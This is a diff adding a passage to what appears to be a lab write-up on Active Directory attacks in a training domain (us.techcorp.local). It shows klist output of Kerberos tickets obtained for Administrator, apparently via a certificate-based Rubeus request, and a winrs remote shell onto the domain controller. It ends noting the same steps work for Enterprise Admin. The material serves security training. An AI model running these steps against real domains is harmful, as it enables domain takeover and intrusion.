@@ -447,3 +447,60 @@ C:\Windows\system32>C:\AD\Tools\Rubeus.exe asktgt /user:Administrator /certifica
   ASREP (key)              :  69A3667CEE956F4B563FF10ADEF27060
 
 ```
+
+Validate:
+
+```
+C:\Windows\system32>klist
+
+Current LogonId is 0:0x184bfdc
+
+Cached Tickets: (3)
+
+#0>     Client: Administrator @ US.TECHCORP.LOCAL
+        Server: krbtgt/US.TECHCORP.LOCAL @ US.TECHCORP.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
+        Start Time: 2/22/2023 11:05:03 (local)
+        End Time:   2/22/2023 21:03:30 (local)
+        Renew Time: 3/1/2023 11:03:30 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x2 -> DELEGATION
+        Kdc Called: US-DC.us.techcorp.local
+
+#1>     Client: Administrator @ US.TECHCORP.LOCAL
+        Server: krbtgt/us.techcorp.local @ US.TECHCORP.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 2/22/2023 11:03:30 (local)
+        End Time:   2/22/2023 21:03:30 (local)
+        Renew Time: 3/1/2023 11:03:30 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+#2>     Client: Administrator @ US.TECHCORP.LOCAL
+        Server: HTTP/us-dc @ US.TECHCORP.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+        Start Time: 2/22/2023 11:05:03 (local)
+        End Time:   2/22/2023 21:03:30 (local)
+        Renew Time: 3/1/2023 11:03:30 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called: US-DC.us.techcorp.local
+
+C:\Windows\system32>winrs -r:us-dc cmd
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>hostname
+hostname
+US-DC
+
+C:\Users\Administrator>whoami
+whoami
+us\administrator
+```
+
+Same procedure for Enterprise ADmin
